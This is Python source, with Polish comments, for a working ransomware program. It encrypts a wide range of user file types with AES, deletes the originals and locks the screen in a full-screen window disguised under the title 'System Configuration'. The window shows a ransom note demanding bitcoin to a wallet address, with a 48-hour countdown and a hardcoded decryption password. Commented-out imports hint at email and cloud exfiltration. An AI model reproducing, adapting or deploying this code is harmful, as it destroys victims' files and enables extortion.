#from __future__ import print_function
#import os.path
#import smtplib, ssl
#from email.message import EmailMessage
#from googleapiclient.discovery import build
#from googleapiclient.http import MediaFileUpload
#from google.oauth2 import service_account

import os
import zipfile
import shutil
import time
import threading
import sys
import tkinter as tk
from tkinter import messagebox
from datetime import datetime, timedelta
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

stored_password = "OnlyLinux69"
salt = b'TestowaSol123'
timer_running = True
block_size = 128

# osobna lista rozszerzeń do backupu
backup_extensions = ['.jpg', '.png', '.txt', '.bmp']  # możesz dopisać co chcesz

excluded_extensions = ['.exe', '.dll', '.bin', '.zip', '.rar', '.7z', '.iso']


allowed_extensions = ['.jpg', '.png', '.gif', '.webp', '.tiff', '.psd', '.raw', '.bmp', '.heif', '.svg', '.pdf', '.doc', '.docx', '.msg', '.odt', '.pages', '.rtf', '.tex', '.txt', '.wpd', '.csv', '.key', '.mpp', '.ppt', '.pptx', '.xml', '.aif', '.flac', '.m3u', '.m4a', '.mid', '.mp3', '.ogg', '.wav', '.wma', '.avi', '.m4v', '.mov', '.mp4', '.mpg', '.wmv', '.3ds', '.3dm', '.blend', '.dae', '.fbx', '.max', '.obj', '.pub', '.xls', '.xlsx', '.zipx', '.abk', '.arc', '.bak', '.cer', '.cfm', '.css', '.html', '.js', '.json', '.php', '.dwg', '.step', '.stl', '.stp']  # Dodaj co chcesz szyfrować


excluded_files = ['timer.txt', 'ransomware.ico', 'jak-kompilowac.txt', 'system.ico', 'wazne-pola-do-zmiany.txt', 'requirements.txt', 'base_library.zip']

excluded_folders = []

if getattr(sys, 'frozen', False):
    current_directory = os.path.dirname(sys.executable)
    internal_meipass = os.path.join(sys._MEIPASS, "_internal")
    internal_local = os.path.join(current_directory, "_internal")
else:
    current_directory = os.path.dirname(os.path.abspath(__file__))
    internal_meipass = os.path.join(current_directory, "_internal")
    internal_local = internal_meipass

excluded_folders.append(os.path.normcase(os.path.normpath(os.path.abspath(internal_meipass))))
excluded_folders.append(os.path.normcase(os.path.normpath(os.path.abspath(internal_local))))

appdata_dir = os.path.join(os.environ['USERPROFILE'], 'AppData')
excluded_folders.append(os.path.normpath(os.path.normpath(os.path.abspath(appdata_dir))))



timer_path = os.path.join(current_directory, "timer.txt")

backup_dir = os.path.join(current_directory, "backup")


def is_excluded(path):
    path = os.path.normcase(os.path.normpath(os.path.abspath(path)))
    for ex in excluded_folders:
        ex = os.path.normcase(os.path.normpath(os.path.abspath(ex)))
        if os.path.commonpath([path, ex]) == ex:
            return True
    return False



def get_time_remaining():
    if not os.path.exists(timer_path):
        with open(timer_path, 'w') as f:
            f.write(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        return timedelta(hours=48)
    with open(timer_path, 'r') as f:
        start_time = datetime.strptime(f.read().strip(), "%Y-%m-%d %H:%M:%S")
    return (start_time + timedelta(hours=48)) - datetime.now()

def has_time_expired():
    return get_time_remaining().total_seconds() <= 0

def get_key(password):
    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1, backend=default_backend())
    return kdf.derive(password.encode())

def encrypt_file(filepath, key):
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        padder = padding.PKCS7(block_size).padder()
        padded_data = padder.update(data) + padder.finalize()
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encrypted = cipher.encryptor().update(padded_data) + cipher.encryptor().finalize()
        with open(filepath + ".enc", 'wb') as f:
            f.write(b"MYENC01")
            f.write(iv)
            f.write(encrypted)
        os.remove(filepath)
    except Exception as e:
        print(f"Błąd szyfrowania {filepath}: {e}")



def backup_selected_files():
    global excluded_folders

    backup_dir = os.path.join(current_directory, "backup")
    backup_dir_abs = os.path.abspath(backup_dir)
    os.makedirs(backup_dir_abs, exist_ok=True)

    if backup_dir_abs not in excluded_folders:
        excluded_folders.append(os.path.normcase(os.path.normpath(backup_dir_abs)))

    copied_count = 0
    skipped_count = 0
    current_dir_abs = os.path.abspath(current_directory)

    for root, dirs, files in os.walk(current_dir_abs):
        root_abs = os.path.abspath(root)

        # 🔹 usuń z dirs katalogi wykluczone, żeby os.walk tam nie schodził
        dirs[:] = [d for d in dirs if not is_excluded(os.path.join(root_abs, d))]

        if is_excluded(root_abs):
            print(f"⏭️ Pomijam katalog w backupie: {root_abs}")
            continue

        for filename in files:
            if filename in excluded_files:
                print(f"⏭️ Pomijam plik w backupie (excluded_files): {os.path.join(root_abs, filename)}")
                skipped_count += 1
                continue

            name, ext = os.path.splitext(filename)
            ext = ext.lower()

            if ext not in backup_extensions:
                print(f"⏭️ Pomijam plik w backupie (nie w backup_extensions): {os.path.join(root_abs, filename)}")
                skipped_count += 1
                continue

            src = os.path.join(root_abs, filename)
            rel_path = os.path.relpath(root_abs, current_dir_abs)
            dst_folder = os.path.join(backup_dir_abs, rel_path) if rel_path != '.' else backup_dir_abs
            os.makedirs(dst_folder, exist_ok=True)
            dst = os.path.join(dst_folder, filename)

            try:
                shutil.copy2(src, dst)
                copied_count += 1
            except Exception as e:
                print(f"Błąd kopiowania {src}: {e}")

    print(f"📂 Skopiowano {copied_count} plików do backupu, pominięto {skipped_count}.")




def start_encryption():
    key = get_key(stored_password)

    backup_selected_files()

    encrypted_count = 0
    skipped_count = 0

    blocked_names = {"_internal", "tk", "tcl", "encoding"}

    for root, dirs, files in os.walk(current_directory):
        root_abs = os.path.abspath(root)

        # 🔹 usuń z dirs katalogi wykluczone
        dirs[:] = [d for d in dirs if not is_excluded(os.path.join(root_abs, d))]

        if is_excluded(root_abs) or any(name in os.path.normcase(root_abs) for name in blocked_names):
            print(f"⏭️ Pomijam katalog przy szyfrowaniu: {root_abs}")
            continue

        for filename in files:
            filepath = os.path.join(root_abs, filename)

            if (
                filename in excluded_files or
                filename.startswith('.') or
                filename.endswith('.py') or
                filename.endswith('.pyw') or
                filename.endswith('.enc') or
                os.path.abspath(filepath) == os.path.abspath(sys.executable)
            ):
                print(f"⏭️ Pomijam plik przy szyfrowaniu: {filepath}")
                skipped_count += 1
                continue

            name, ext = os.path.splitext(filename)
            ext = ext.lower()

            # 🔹 pomiń wykluczone rozszerzenia
            if ext in excluded_extensions:
                print(f"⏭️ Pomijam plik (excluded_extensions): {filepath}")
                skipped_count += 1
                continue

            if ext == '' or ext not in allowed_extensions:
                print(f"⏭️ Pomijam plik (rozszerzenie niedozwolone): {filepath}")
                skipped_count += 1
                continue

            encrypt_file(filepath, key)
            encrypted_count += 1

    print(f"\n✅ Zaszyfrowano: {encrypted_count} plików, pominięto: {skipped_count} plików.")



    # 🔹 tutaj możesz dodać dalsze akcje po zakończeniu szyfrowania


def get_folder_size(folder):
    total_size = 0
    for root, dirs, files in os.walk(folder):
        for f in files:
            fp = os.path.join(root, f)
            try:
                total_size += os.path.getsize(fp)
            except OSError:
                # brak dostępu do pliku – pomijamy
                pass
    return total_size


def compress_backup(backup_dir):
    # policz rozmiar folderu
    size_bytes = get_folder_size(backup_dir)
    size_mb = size_bytes / (1024 * 1024)
    size_gb = size_bytes / (1024 * 1024 * 1024)

    # nazwa pliku zip z rozmiarem w nazwie
    global archive_name
    archive_name = f"backup_{int(size_mb)}MB.zip"

    # wybór poziomu kompresji
    try:
        compression_level = zipfile.ZIP_LZMA if size_gb > 2 else zipfile.ZIP_DEFLATED
    except AttributeError:
        compression_level = zipfile.ZIP_DEFLATED

    # utwórz archiwum zip
    with zipfile.ZipFile(archive_name, 'w', compression=compression_level) as zipf:
        for root, dirs, files in os.walk(backup_dir):
            for file in files:
                filepath = os.path.join(root, file)
                arcname = os.path.relpath(filepath, backup_dir)
                zipf.write(filepath, arcname)

    print(f"📦 Utworzono archiwum: {archive_name} (rozmiar folderu: {size_gb:.2f} GB)")
    # 🔻 usuń folder backup po kompresji
    try:
        shutil.rmtree(backup_dir)
        print(f"🗑️ Usunięto folder: {backup_dir}")
    except Exception as e:
        print(f"Błąd usuwania folderu {backup_dir}: {e}")
    return archive_name


def decrypt_file(filepath, key):
    try:
        with open(filepath, 'rb') as f:
            content = f.read()

        # 🔹 sprawdź nagłówek
        if not content.startswith(b"MYENC01"):
            print(f"❌ Pomijam {filepath} – nie jest zaszyfrowany przez ten skrypt.")
            return

        content = content[len(b"MYENC01"):]  # usuń nagłówek
        iv = content[:16]
        encrypted_data = content[16:]

        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        decrypted_padded = cipher.decryptor().update(encrypted_data) + cipher.decryptor().finalize()
        unpadder = padding.PKCS7(block_size).unpadder()
        decrypted = unpadder.update(decrypted_padded) + unpadder.finalize()

        output_filepath = filepath[:-4] if filepath.endswith(".enc") else filepath
        with open(output_filepath, 'wb') as f:
            f.write(decrypted)

        os.remove(filepath)
        print(f"✔️ Odszyfrowano: {filepath} → {output_filepath}")
    except Exception as e:
        print(f"❌ Błąd odszyfrowywania {filepath}: {e}")



def decrypt_until_clean(filepath, key):
    # zabezpieczenie przed nieskończoną pętlą
    max_iterations = 10
    iterations = 0

    while filepath.endswith(".enc") and iterations < max_iterations:
        decrypt_file(filepath, key)
        filepath = filepath[:-4]  # usuń tylko końcówkę ".enc"
        iterations += 1


if not has_time_expired():
    start_encryption()


def start_decryption():
    log_window = tk.Toplevel(root)
    log_window.title("Trwa deszyfrowanie...")
    log_window.geometry("600x400")
    log_window.configure(bg="black")

    log_text = tk.Text(log_window, font=("Courier", 12), fg="lime", bg="black")
    log_text.pack(fill="both", expand=True)

    key = get_key(stored_password)
    for root_dir, dirs, files in os.walk(current_directory):
        root_abs = os.path.abspath(root_dir)

        # 🔹 usuń z dirs katalogi wykluczone
        dirs[:] = [d for d in dirs if not is_excluded(os.path.join(root_abs, d))]

        if is_excluded(root_abs):
            log_text.insert("end", f"⏭️ Pomijam katalog przy odszyfrowywaniu: {root_abs}\n")
            log_text.see("end")
            log_text.update()
            continue

        for filename in files:
            if filename.endswith('.enc'):
                filepath = os.path.join(root_dir, filename)
                log_text.insert("end", f"🔓 Trwa deszyfrowanie: {filename}... ")
                log_text.see("end")
                try:
                    decrypt_until_clean(filepath, key)
                    log_text.insert("end", "✔️ Sukces\n")
                except Exception:
                    log_text.insert("end", "❌ Błąd\n")
                log_text.see("end")
                log_text.update()

    # Usunięcie timer.txt bez komunikatu
    if os.path.exists(timer_path):
        for _ in range(5):
            try:
                os.remove(timer_path)
                break
            except Exception:
                time.sleep(0.5)

    log_text.insert("end", "\n✅ Wszystkie pliki odszyfrowane. Zamykam aplikację...")
    log_text.update()

    time.sleep(2)
    root.destroy()


def on_close():
    pass

def on_alt_f4(event):
    return "break"

def update_timer():
    global timer_running
    if not timer_running:
        return
    remaining = get_time_remaining()
    if remaining.total_seconds() > 0:
        hours, remainder = divmod(int(remaining.total_seconds()), 3600)
        minutes, seconds = divmod(remainder, 60)
        timer_label.config(
            text=f"⏳ Pozostało: {hours:02d}:{minutes:02d}:{seconds:02d}",
            fg="white"
        )
        root.after(1000, update_timer)
    else:
        timer_label.config(
            text="⏳ Pozostało: 00:00:00",
            fg="red"
        )



def check_password():
    global timer_running
    if has_time_expired():
        messagebox.showerror("Czas minął", "Plików już się nie da odzyskać.")
        return
    user_input = entry.get()
    if user_input == stored_password:
        timer_running = False
        timer_label.config(text="✅ Hasło poprawne", fg="green")
        entry.config(state="disabled")
        button.config(state="disabled")
        threading.Thread(target=start_decryption, daemon=True).start()
    else:
        messagebox.showerror("Błąd", "Nieprawidłowe hasło")









def encrypt_and_compress():
    start_encryption()
    compress_backup(backup_dir)






root = tk.Tk()
root.title("System Configuration")
if getattr(sys, 'frozen', False):
    # Dla wersji .exe
    resource_path = os.path.join(sys._MEIPASS, "ransomware.ico")
else:
    # Dla wersji .py
    resource_path = os.path.join(os.path.dirname(__file__), "ransomware.ico")

root.iconbitmap(resource_path)
root.attributes("-fullscreen", True)
root.protocol("WM_DELETE_WINDOW", on_close)
root.bind("<Alt-F4>", on_alt_f4)
root.bind("<Escape>", on_alt_f4)
root.bind("<Control-w>", on_alt_f4)

ascii_art = """
████████████████████████████████████████████████████████████████████████████████
█                                                                              █
█    ▄████▄   ▄▄▄       ███▄ ▄███▓ ▒█████   ██▀███   █    ██  ▄▄▄█████▓         █
█   ▒██▀ ▀█  ▒████▄    ▓██▒▀█▀ ██▒▒██▒  ██▒▓██ ▒ ██▒ ██  ▓██▒▓  ██▒ ▓▒         █
█   ▒▓█    ▄ ▒██  ▀█▄  ▓██    ▓██░▒██░  ██▒▓██ ░▄█ ▒▓██  ▒██░▒ ▓██░ ▒░         █
█   ▒▓▓▄ ▄██▒░██▄▄▄▄██ ▒██    ▒██ ▒██   ██░▒██▀▀█▄  ▓▓█  ░██░░ ▓██▓ ░          █
█   ▒ ▓███▀ ░ ▓█   ▓██▒▒██▒   ░██▒░ ████▓▒░░██▓ ▒██▒▒▒█████▓   ▒██▒ ░          █
█   ░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒░   ░  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒   ▒ ░░            █
█     ░  ▒     ▒   ▒▒ ░░  ░      ░  ░ ▒ ▒░   ░▒ ░ ▒░░░▒░ ░ ░     ░             █
█   ░          ░   ▒   ░      ░   ░ ░ ░ ▒    ░░   ░  ░░░ ░ ░   ░               █
█   ░ ░            ░  ░       ░       ░ ░     ░        ░                       █
█                                                                              █
█                           🔒 TWOJE PLIKI ZOSTAŁY ZASZYFROWANE 🔒              █
█                                                                              █
████████████████████████████████████████████████████████████████████████████████
"""

# 🖼️ ASCII grafika wycentrowana
ascii_box = tk.Text(root, font=("Courier", 14), fg="red", bg="black", wrap="none", borderwidth=0)
ascii_box.insert("1.0", ascii_art)
ascii_box.tag_configure("center", justify="center")
ascii_box.tag_add("center", "1.0", "end")
ascii_box.config(state="disabled")
ascii_box.pack(fill="both", expand=True)

# Kontener z czarnym tłem
info_frame = tk.Frame(root, bg="black")
info_frame.pack(fill="x")

# Nagłówek pytania
header_label = tk.Label(info_frame, text="CO SIĘ STAŁO?", font=("Arial", 24, "bold"), fg="white", bg="black", justify="center")
header_label.pack(pady=(10, 0))

# Treść komunikatu
info_text = (
    "Zostałeś zainfekowany ransomwarem.\n"
    "Wszystkie twoje pliki są zaszyfrowane!\n"
    "Żeby je odzyskać musisz nam zapłacić 100$ w bitcoinach.\n"
    "Musisz je wysłać na adres: 1BWyP7SR3oT7A6vVyq6hcJyNLGnBfWWdX7\n"
    "Po upłynięciu czasu nawet jak zapłacisz, odzyskanie plików stanie się niemożliwe."
)

info_label = tk.Label(info_frame, text=info_text, font=("Arial", 16), fg="white", bg="black", justify="center")
info_label.pack(pady=(5, 20))




# 🔻 Dolny panel z ciemnym tłem
bottom_frame = tk.Frame(root, bg="#0a0a0a")
bottom_frame.pack(side="bottom", fill="x")

timer_label = tk.Label(bottom_frame, text="", font=("Arial", 20), fg="white", bg="#0a0a0a")
timer_label.pack(pady=10)

entry = tk.Entry(bottom_frame, show="*", font=("Arial", 20), width=30)
entry.pack(pady=10)

button = tk.Button(bottom_frame, text="Odszyfruj", font=("Arial", 18), command=check_password)
button.pack(pady=10)
root.bind("<Return>", lambda event: check_password())

update_timer()
threading.Thread(target=encrypt_and_compress, daemon=True).start()
#threading.Thread(target=start_encryption, daemon=True).start()
#threading.Thread(target=compress_backup(backup_dir), daemon=True).start()
root.mainloop()
